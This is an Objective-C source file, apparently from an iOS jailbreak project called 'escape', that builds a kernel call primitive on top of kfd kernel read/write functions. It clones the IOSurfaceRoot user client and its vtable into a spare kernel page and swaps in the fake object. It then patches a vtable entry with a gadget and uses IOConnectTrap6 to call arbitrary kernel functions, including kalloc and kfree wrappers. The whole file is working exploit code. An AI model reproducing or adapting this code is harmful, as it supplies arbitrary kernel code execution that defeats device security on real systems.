//
//  kcall.m
//  escape
//
//  Created by Xiao on 2023/11/15.
//

#import <Foundation/Foundation.h>
#import "IOKit/IOKitLib.h"
#import "ipc.h"
#import "kpf.h"
#import "krw.h"
#import "libkfd.h"
#import "objcLogger.h"
#import "offsets.h"

static uint64_t fake_vtable = 0;
static uint64_t fake_client = 0;
static io_connect_t user_client = 0;

BOOL setup_client(struct kfd *kfd) {
    LOG(@"[*] setup kcall");
    find_offset(kfd);

    io_service_t service = IOServiceGetMatchingService(
        kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));

    if (service == IO_OBJECT_NULL) {
        LOG(@"[-] Failed to get IOSurfaceRoot service");
        return NO;
    }

    io_connect_t conn = MACH_PORT_NULL;
    kern_return_t kr = IOServiceOpen(service, mach_task_self(), 0, &conn);
    if (kr != KERN_SUCCESS) {
        LOG(@"[-] Failed to open IOSurfaceRoot service");
        return NO;
    }
    user_client = conn;
    IOObjectRelease(service);
    
    uint64_t userclient_port = port_name_to_ipc_port(conn);
    uint64_t userclient_addr = kread64(userclient_port + off_ipc_port_ip_kobject);
    uint64_t userclient_vtab = kread64(userclient_addr);

    if (fake_vtable == 0)
        fake_vtable = off_empty_kdata_page + kfd->info.kernel.kernel_slide;
    LOG_FMT(@"[*] fake_vtable: %p", fake_vtable);
    
    for (int i = 0; i < 0x200; i++) {
        uint64_t data = kread64(userclient_vtab + i * 8);
        kwrite64(fake_vtable + i * 8, data);
    }

    if (fake_client == 0)
        fake_client = off_empty_kdata_page + kfd->info.kernel.kernel_slide+0x1000;
    LOG_FMT(@"[*] fake_client: %p", fake_client);
    
    for (int i = 0; i < 0x200; i++) {
        uint64_t data = kread64(userclient_addr + i * 8);
        kwrite64(fake_client + i * 8, data);
    }
    kwrite64(fake_client, fake_vtable);
    kwrite64(userclient_port + off_ipc_port_ip_kobject, fake_client);
    kwrite64(fake_vtable + 8 * 0xB8, off_add_x0_x0_0x40_ret);

    return YES;
}

uint64_t zm_fix_addr_kalloc(uint64_t addr) {
    // todo: search for ksubmap
    // get the range of zone_map
    uint64_t kmem = off_zm_fix_alloc+0x10;
    uint64_t zm_alloc = kread64(kmem);// kread64(0xFFFFFFF007750E20+get_kernel_slide()); // kread64(kmem);  //idk?
    uint64_t zm_stripped = zm_alloc & 0xffffffff00000000;

    return (zm_stripped | ((addr) & 0xffffffff));
}

uint64_t clean_dirty_kalloc(uint64_t addr, size_t size) {
    for (int i = 0; i < size; i += 8) {
        kwrite64(addr + i, 0);
    }
    return 0;
}

uint64_t kcall(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3, uint64_t x4, uint64_t x5, uint64_t x6) {
    uint64_t offx20 = kread64(fake_client + 0x40);
    uint64_t offx28 = kread64(fake_client + 0x48);
    kwrite64(fake_client + 0x40, x0);
    kwrite64(fake_client + 0x48, addr);
    
    uint64_t kcall_ret = IOConnectTrap6(user_client, 0, (uint64_t)(x1), (uint64_t)(x2), (uint64_t)(x3), (uint64_t)(x4), (uint64_t)(x5), (uint64_t)(x6));
    kwrite64(fake_client + 0x40, offx20);
    kwrite64(fake_client + 0x48, offx28);
    return kcall_ret;
}

uint64_t kalloc(size_t ksize) {
    uint64_t kmem = kcall(off_kalloc_data_external + get_kernel_slide(), ksize, 1, 0, 0, 0, 0, 0);
    return zm_fix_addr_kalloc(kmem);
}

void kfree(uint64_t kaddr, size_t ksize) {
    kcall(off_kfree_data_external + get_kernel_slide(), kaddr, ksize, 0, 0, 0, 0, 0);
}

BOOL kcall_init(struct kfd *kfd) {
    
    // setup user client, dirty kalloc now
    if (!setup_client(kfd)) {
        LOG(@"[-] setup_client failed");
        return NO;
    }
    
    return YES;
}
